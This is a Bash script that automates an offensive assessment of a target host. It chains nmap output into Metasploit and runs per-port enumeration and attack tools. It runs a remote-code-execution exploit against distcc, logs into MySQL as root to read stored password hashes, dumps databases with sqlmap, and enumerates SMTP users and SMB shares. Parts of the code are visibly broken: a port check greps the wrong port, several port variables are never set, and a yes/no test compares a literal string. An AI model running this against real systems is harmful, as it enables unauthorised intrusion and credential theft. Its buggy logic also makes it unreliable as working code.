#!/bin/bash

clear 

TARGET=$1

bash ../../recon.sh $TARGET

mkdir "$TARGET"_auto_assess
cd "$TARGET"_auto_assess
clear

/etc/init.d/postgresql start
msfdb init

echo -e "\e[1;31m----------------------------------------\e[00m"

echo "Setting up workspaces"

msfconsole --quiet -x "setg RHOSTS $TARGET; workspace -a "$TARGET"_workspace; workspace "$TARGET"_workspace; db_import ../"$TARGET"_recon/"$TARGET"_TCP_scan.XML ;
services -c name,port,info $TARGET;
exit y"

NMAPOUT=../"$TARGET"_recon/"$TARGET"_TCP_scan.XML

port_21=`grep 'portid="21"' $NMAPOUT | grep open`
port_22=`grep 'portid="22"' $NMAPOUT | grep open`
port_23=`grep 'portid="23"' $NMAPOUT | grep open`
port_25=`grep 'portid="25"' $NMAPOUT | grep open`
port_53=`grep 'portid="53"' $NMAPOUT | grep open`
port_79=`grep 'portid="79"' $NMAPOUT | grep open`
port_80=`grep 'portid="80"' $NMAPOUT | grep open`
port_111=`grep 'portid="111"' $NMAPOUT | grep open`
port_135=`grep 'portid="135"' $NMAPOUT | grep open`
port_139=`grep 'portid="139"' $NMAPOUT | grep open`
port_162=`grep 'portid="162"' $NMAPOUT | grep open`
port_389=`grep 'portid="162"' $NMAPOUT | grep open`
port_443=`grep 'portid="443"' $NMAPOUT | grep open`
port_445=`grep 'portid="445"' $NMAPOUT | grep open`
port_512=`grep 'portid="512"' $NMAPOUT | grep open`
port_513=`grep 'portid="513"' $NMAPOUT | grep open`
port_514=`grep 'portid="514"' $NMAPOUT | grep open`
port_1521=`grep 'portid="1521"' $NMAPOUT | grep open`
port_1099=`grep 'portid="1099"' $NMAPOUT | grep open`
port_1524=`grep 'portid="1524"' $NMAPOUT | grep open`
port_2049=`grep 'portid="2049"' $NMAPOUT | grep open`
port_2121=`grep 'portid="2121"' $NMAPOUT | grep open`
port_3128=`grep 'portid="3128"' $NMAPOUT | grep open`
port_3306=`grep 'portid="3306"' $NMAPOUT | grep open`
port_3389=`grep 'portid="3389"' $NMAPOUT | grep open`
port_3632=`grep 'portid="3632"' $NMAPOUT | grep open`
port_5432=`grep 'portid="5432"' $NMAPOUT | grep open`
port_5800=`grep 'portid="5800"' $NMAPOUT | grep open`
port_5900=`grep 'portid="5900"' $NMAPOUT | grep open`
port_6667=`grep 'portid="6667"' $NMAPOUT | grep open`
port_8000=`grep 'portid="8000"' $NMAPOUT | grep open`
port_8009=`grep 'portid="8009"' $NMAPOUT | grep open`
port_8080=`grep 'portid="8080"' $NMAPOUT | grep open`
port_8180=`grep 'portid="8180"' $NMAPOUT | grep open`


if [ -z "$port_21" ]
then
	echo -e "$\033[91m [-] Port 21 closed... skipping.$\e[0m"
else
	echo -e "$\033[92m [+] Port 21 opened... running tests...$\e[0m"	
	msfconsole --quiet -x "workspace "$TARGET"_workspace; setg RHOST $TARGET; spool "$TARGET"_ftp_scan.txt ; resource ../../../resource/ftp_scan.rc; exit y"	

fi

if [ -z "$port_22" ]
then
	echo -e "$\033[91m [-] Port 22 closed... skipping.$\e[0m"
else
	echo -e "$\033[92m [+] Port 22 opened... running tests...$\e[0m"
	msfconsole --quiet -x "workspace "$TARGET"_workspace; setg RHOST $TARGET; spool "$TARGET"_ssh_scan.txt ; resource ../../../resource/ssh_scan.rc; exit y"
fi

if [ -z "$port_23" ]
then
	echo -e "$\033[91m [-] Port 23 closed... skipping.$\e[0m"
else
	echo -e "$\033[92m [+] Port 23 opened... running tests...$\e[0m"
	echo ""
	cisco-torch -A $TARGET
	msfconsole --quiet -x "workspace "$TARGET"_workspace; setg RHOST $TARGET; spool "$TARGET"_telnet_scan.txt ; resource ../../../resource/telnet_scan.rc; exit y"
fi

if [ -z "$port_25" ]
then
	echo -e "$\033[91m [-] Port 25 closed... skipping.$\e[0m"
else
	echo -e "$\033[92m [+] Port 25 opened... running tests...$\e[0m"
	nmap -sV  --script=smtp* -p 25 $TARGET
	smtp-user-enum -M VRFY -U $USER_FILE -t $TARGET
	msfconsole --quiet -x "workspace "$TARGET"_workspace; setg RHOST $TARGET; spool "$TARGET"_smtp_scan.txt ; resource ../../../resource/smtp_scan.rc; exit y"
fi

if [ -z "$port_53" ]
then
	echo -e "$\033[91m [-] Port 53 closed... skipping.$\e[0m"
else
	echo -e "$\033[92m [+] Port 53 opened... running tests...$\e[0m"
	nmap -sV --script=dns* -p U:53,T:53 $TARGET	| tee "$TARGET"_dns_scan.txt
fi

if [ -z "$port_79" ]
then
	echo -e "$\033[91m [-] Port 79 closed... skipping.$\e[0m"
else
	echo -e "$\033[92m [+] Port 79 opened... running tests...$\e[0m"
	nmap -sV --script=finger* -p 79 $TARGET | tee "$TARGET"_finger_scan.txt
fi

if [ -z "$port_80" ]
then
	echo -e "$\033[91m [-] Port 80 closed... skipping.$\e[0m"
else
	echo -e "$\033[92m [+] Port 80 opened... running tests...$\e[0m"
	wafw00f http://$TARGET
	echo ""
	whatweb http://$TARGET
	xsstracer $TARGET 80
	echo ""
	
	echo "$\033[93m Do you wish to perform a web scan?... (y/n) $\e[0m"
	read WEBANS

	if [ WEBANS = yes ]
		then

			nikto -h http://$TARGET 
			cutycapt --url=http://$TARGET --out=loot/$TARGET-port80.jpg
			dirb http://$TARGET
			wpscan --url http://$TARGET --batch
			wpscan --url http://$TARGET/wordpress/ --batch
			sqlmap -u "http://$TARGET" --batch --crawl=5 --level 1 --risk 1 -f -a			
	fi

	msfconsole --quiet -x "workspace "$TARGET"_workspace; setg RHOST $TARGET; spool "$TARGET"_port80_scan.txt ; resource ../../../resource/80_http_scan.rc; exit y"
fi

if [ -z "$port_135" ]
then
	echo -e "$\033[91m [-] Port 135 closed... skipping.$\e[0m"
else
	echo -e "$\033[92m [+] Port 135 opened... running tests...$\e[0m"
	rpcinfo -p $TARGET
	nmap -p 135 -v --script=rpc* $TARGET | tee "$TARGET"_rpc_scan.txt
fi

if [ -z "$port_139" ]
then
	echo -e "$\033[91m [-] Port 139 closed... skipping.$\e[0m"
else
	echo -e "$\033[92m [+] Port 139 opened... running tests...$\e[0m"
	enum4linux $TARGET
	nbtscan $TARGET
	msfconsole --quiet -x "workspace "$TARGET"_workspace; setg RHOST $TARGET; set RPORT 139; spool "$TARGET"_smb_scan.txt ; resource ../../../resource/smb_scan.rc; exit y"
fi

if [ -z "$port_161" ]
then
	echo -e "$\033[91m [-] Port 161 closed... skipping.$\e[0m"
else
	echo -e "$\033[92m [+] Port 161 opened... running tests...$\e[0m"
	msfconsole --quiet -x "workspace "$TARGET"_workspace; setg RHOST $TARGET; spool "$TARGET"_snmp_scan.txt ; resource ../../../resource/snmp_scan.rc; exit y"
fi

if [ -z "$port_389" ]
then
	echo -e "$\033[91m [-] Port 389 closed... skipping.$\e[0m"
else
	echo -e "$\033[92m [+] Port 389 opened... running tests...$\e[0m"
	nmap -p 389 -v --script=ldap* $TARGET | tee "$TARGET"_ldap_scan.txt
fi

if [ -z "$port_443" ]
then
	echo -e "$\033[91m [-] Port 443 closed... skipping.$\e[0m"
else
	echo -e "$\033[92m [+] Port 443 opened... running tests...$\e[0m"
	wafw00f https://$TARGET
	echo ""
	whatweb https://$TARGET
	echo ""
	sslscan --no-failed $TARGET 
	echo ""
		
	echo "$\033[93m Do you wish to perform a web scan?... (y/n) $\e[0m"
	read WEBANS

	if [ WEBANS = yes ]
		then
			nikto -h https://$TARGET 
			cutycapt --url=https://$TARGET --out=loot/$TARGET-port443.jpg
			dirb https://$TARGET
			wpscan --url https://$TARGET --batch
			wpscan --url https://$TARGET/wordpress/ --batch
	
			sqlmap -u "https://$TARGET" --batch --crawl=5 --level 1 --risk 1 -f -a
	fi
	msfconsole --quiet -x "workspace "$TARGET"_workspace; setg RHOST $TARGET; spool "$TARGET"_443_http_scan.txt ; resource ../../../resource/443_http_scan.rc; exit y"	

fi

if [ -z "$port_445" ]
then
	echo -e "$\033[91m [-] Port 445 scanned... skipping.$\e[0m"
else
	echo -e "$\033[92m [+] Port 445 opened... running tests...$\e[0m"
	enum4linux $TARGET
	nbtscan $TARGET
	msfconsole --quiet -x "workspace "$TARGET"_workspace; setg RHOST $TARGET; set RPORT 445; spool "$TARGET"_smb_scan.txt ; resource ../../../resource/smb_scan.rc; exit y"
fi

if [ -z "$port_512" ]
then
	echo -e "$\033[91m [-] Port 512 closed... skipping.$\e[0m"
else
	echo -e "$\033[92m [+] Port 512 opened... running tests...$\e[0m"
	nmap -sV  -p 512 --script=rexec* $TARGET | tee "$TARGET"_rexec_scan.txt
fi

if [ -z "$port_513" ]
then
	echo -e "$\033[91m [-] Port 513 closed... skipping.$\e[0m"
else
	echo -e "$\033[92m [+] Port 513 opened... running tests...$\e[0m"
	nmap -sV  -p 513 --script=rlogin* $TARGET | tee "$TARGET"_rlogin_scan.txt
fi


if [ -z "$port_1521" ]
then
	echo -e "$\033[91m [-] Port 1521 closed... skipping.$\e[0m"
else
	echo -e "$\033[92m [+] Port 1521 opened... running tests...$\e[0m"
	msfconsole --quiet -x "workspace "$TARGET"_workspace; setg RHOST $TARGET; spool "$TARGET"_oracle_scan.txt ; resource ../../../resource/oracle_scan.rc; exit y"
	oscanner -s $TARGET -P 1521 -v | tee "$TARGET"_oracle_scan.txt
	sidguess -i $TARGET -d /usr/share/wordlists/metasploit/unix_users.txt | tee "$TARGET"_oracle_scan.txt
fi


if [ -z "$port_2049" ]
then
	echo -e "$\033[91m [-] Port 2049 closed... skipping.$\e[0m"
else
	echo -e "$\033[92m [+] Port 2049 opened... running tests...$\e[0m"
	nmap -sV --script=nfs* -p 2049 $TARGET
	rpcinfo -p $TARGET
	smbclient -L $TARGET -U " "%" "
fi


if [ -z "$port_3306" ]
then
	echo -e "$\033[91m [-] Port 3306 closed... skipping.$\e[0m"
else
	echo -e "$\033[92m [+] Port 3306 opened... running tests...$\e[0m"
	msfconsole --quiet -x "workspace "$TARGET"_workspace; setg RHOST $TARGET; spool "$TARGET"_mysql_scan.txt ; resource ../../../resource/mysql_scan.rc; exit y"
	mysql -u root -h $TARGET -e 'SHOW DATABASES; SELECT Host,User,Password FROM mysql.user;'
fi

if [ -z "$port_3128" ]
then
	echo -e "$\033[91m [-] Port 3128 closed... skipping.$\e[0m"
else
	echo -e "$\033[92m [+] Port 3128 opened... running tests...$\e[0m"
	nmap -p 3128 -sV --script=*proxy* $TARGET
fi

if [ -z "$port_3389" ]
then
	echo -e "$\033[91m [-] Port 3389 closed... skipping.$\e[0m"
else
	echo -e "$\033[92m [+] Port 3389 opened... running tests...$\e[0m"
	nmap -sV --script=rdp-* -p 3389 $TARGET
fi

if [ -z "$port_3632" ]
then
	echo -e "$\033[91m [-] Port 3632 closed... skipping.$\e[0m"
else
	echo -e "$\033[92m [+] Port 3632 opened... running tests...$\e[0m"
	nmap -sV  --script=distcc-* -p 3632 $TARGET
	msfconsole -x "workspace "$TARGET"_workspace; setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use unix/misc/distcc_exec; run; exit;"
fi

if [ -z "$port_5432" ]
then
	echo -e "$\033[91m [-] Port 5432 closed... skipping.$\e[0m"
else
	echo -e "$\033[92m [+] Port 5432 opened... running tests...$\e[0m"
	msfconsole --quiet -x "workspace "$TARGET"_workspace; setg RHOST $TARGET; spool "$TARGET"_pgsql_scan.txt ; resource ../../../resource/postgres_scan.rc; exit y"
fi

if [ -z "$port_5800" ]
then
	echo -e "$\033[91m [-] Port 5800 closed... skipping.$\e[0m"
else
	echo -e "$\033[92m [+] Port 5800 opened... running tests...$\e[0m"
	msfconsole --quiet -x "workspace "$TARGET"_workspace; setg RHOST $TARGET; spool "$TARGET"_vnc_scan.txt ; resource ../../../resource/vnc_scan.rc; exit y"
fi

if [ -z "$port_5900" ]
then
	echo -e "$\033[91m [-] Port 5900 closed... skipping.$\e[0m"
else
	echo -e "$\033[92m [+] Port 5900 opened... running tests...$\e[0m"
	msfconsole --quiet -x "workspace "$TARGET"_workspace; setg RHOST $TARGET; spool "$TARGET"_vnc_scan.txt ; resource ../../../resource/vnc_scan.rc; exit y"
fi

if [ -z "$port_6000" ]
then
	echo -e "$\033[91m [-] Port 6000 closed... skipping.$\e[0m"
else
	echo -e "$\033[92m [+] Port 6000 opened... running tests...$\e[0m"
	msfconsole --quiet -x "workspace "$TARGET"_workspace; setg RHOST $TARGET; spool "$TARGET"_x11_scan.txt ; resource ../../../resource/x11_scan.rc; exit y"
fi

if [ -z "$port_6667" ]
then
	echo -e "$\033[91m [-] Port 6667 closed... skipping.$\e[0m"
else
	echo -e "$\033[92m [+] Port 6667 opened... running tests...$\e[0m"
	msfconsole --quiet -x "workspace "$TARGET"_workspace; setg RHOST $TARGET; spool "$TARGET"_irc_scan.txt ; resource ../../../resource/irc_scan.rc; exit y"
fi

if [ -z "$port_8000" ]
then
	echo -e "$\033[91m [-] Port 8000 closed... skipping.$\e[0m"
else
	echo -e "$\033[92m [+] Port 8000 opened... running tests...$\e[0m"
	wafw00f http://$TARGET:8000
	echo ""
	whatweb http://$TARGET:8000
	echo ""
	xsstracer $TARGET 8000
	sslscan --no-failed $TARGET:8000
	nikto -h http://$TARGET:8000 

fi

if [ -z "$port_8100" ]
then
	echo -e "$\033[91m [-] Port 8100 closed... skipping.$\e[0m"
else
	echo -e "$\033[92m [+] Port 8100 opened... running tests...$\e[0m"
	wafw00f http://$TARGET:8100
	echo ""
	whatweb http://$TARGET:8100
	echo ""
	xsstracer $TARGET 8100
	sslscan --no-failed $TARGET:8100
	nikto -h http://$TARGET:8100 

fi

if [ -z "$port_8080" ]
then
	echo -e "$\033[91m [-] Port 8080 closed... skipping.$\e[0m"
else
	echo -e "$\033[92m [+] Port 8080 opened... running tests...$\e[0m"
	wafw00f http://$TARGET:8080
	echo ""
	whatweb http://$TARGET:8080
	echo ""
	xsstracer $TARGET 8080
	sslscan --no-failed $TARGET:8080
	
	nikto -h http://$TARGET:8080 
	msfconsole --quiet -x "workspace "$TARGET"_workspace; setg RHOST $TARGET; setg RPORT 8080; spool "$TARGET"_tomcat_scan.txt ; resource ../../../resource/tomcat_scan.rc; exit y"
	
	
fi

if [ -z "$port_8180" ]
then
	echo -e "$\033[91m [-] Port 8180 closed... skipping.$\e[0m"
else
	echo -e "$\033[92m [+] Port 8180 opened... running tests...$\e[0m"
	wafw00f http://$TARGET:8180
	echo ""
	whatweb http://$TARGET:8180
	echo ""
	xsstracer $TARGET 8180
	sslscan --no-failed $TARGET:8180
	nikto -h http://$TARGET:8180 

	msfconsole --quiet -x "workspace "$TARGET"_workspace; setg RHOST $TARGET; setg RPORT 8180; spool "$TARGET"_tomcat_scan.txt ; resource ../../../resource/tomcat_scan.rc; exit y"
fi

cd ..

sleep 3


